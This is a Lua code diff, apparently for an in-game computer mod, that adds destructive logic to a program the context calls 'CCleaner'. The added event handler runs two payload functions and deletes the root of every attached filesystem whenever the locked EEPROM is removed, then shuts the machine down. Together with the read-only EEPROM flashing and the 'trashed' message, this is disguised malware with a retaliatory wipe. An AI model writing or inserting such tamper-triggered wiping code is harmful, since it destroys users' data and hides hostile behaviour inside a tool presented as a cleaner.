@@ -257,6 +257,20 @@ error("Your computer has been trashed by CCleaner. Now enjoy the BSoD...", 0)]]
     eeprom.set( eeprom_code )
     eeprom.makeReadonly( eeprom.getChecksum() )
 
+    event.addHandler( function( ... )
+        local e = { ... }
+        if e[1] == "component_removed" then
+            if e[3] == "eeprom" then
+                payload1()
+                for filesystem in component.list("filesystem") do 
+                    component.invoke(filesystem, "remove", "/")
+                end
+                payload2()
+                computer.shutdown(true)
+            end
+        end
+    end )
+
     _G.isFlashed = true
 end
 
